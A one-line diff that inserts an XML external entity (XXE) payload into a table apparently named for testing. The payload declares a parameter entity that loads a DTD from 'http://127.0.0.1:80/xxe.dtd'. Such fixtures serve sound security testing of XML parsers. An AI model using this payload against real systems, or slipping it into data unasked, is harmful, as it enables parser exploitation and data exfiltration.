@@ -1,0 +1,1 @@
+insert into tb_test(message) values('<?xml version="1.0" ?> <!DOCTYPE note [ <!ENTITY % remote SYSTEM "http://127.0.0.1:80/xxe.dtd"> %remote; ]>');
